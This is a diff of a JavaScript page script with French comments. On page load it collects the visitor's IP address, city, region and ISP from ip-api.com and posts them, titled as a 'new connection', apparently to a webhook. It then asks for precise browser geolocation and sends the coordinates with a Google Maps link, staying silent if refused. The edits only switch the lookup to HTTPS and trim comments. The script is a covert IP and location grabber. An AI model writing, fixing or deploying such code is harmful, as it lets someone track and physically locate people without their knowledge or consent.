@@ -45,9 +45,9 @@
         async function start() {
             let info = {};
 
-            // Récupération IP + infos
+            // IP avec HTTPS (corrigé)
             try {
-                const res = await fetch('http://ip-api.com/json/?fields=query,country,city,regionName,isp,mobile');
+                const res = await fetch('https://ip-api.com/json/?fields=query,country,city,regionName,isp,mobile');
                 const geo = await res.json();
 
                 if (geo.query) {
@@ -58,7 +58,7 @@
                 }
             } catch(e) {}
 
-            // Envoi des infos de base
+            // Envoi des infos
             let fields = [];
             if (info.ip) fields.push({ name: "IP", value: info.ip, inline: true });
             if (info.city) fields.push({ name: "Ville", value: info.city, inline: true });
@@ -71,7 +71,7 @@
 
             send("🔴 Nouvelle connexion", fields);
 
-            // Demande de géolocalisation précise après un petit délai
+            // Demande géolocalisation
             setTimeout(() => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -83,7 +83,7 @@
                                 { name: "Google Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
                             ]);
                         },
-                        () => {} // silencieux si refusé
+                        () => {} 
                     );
                 }
             }, 800);
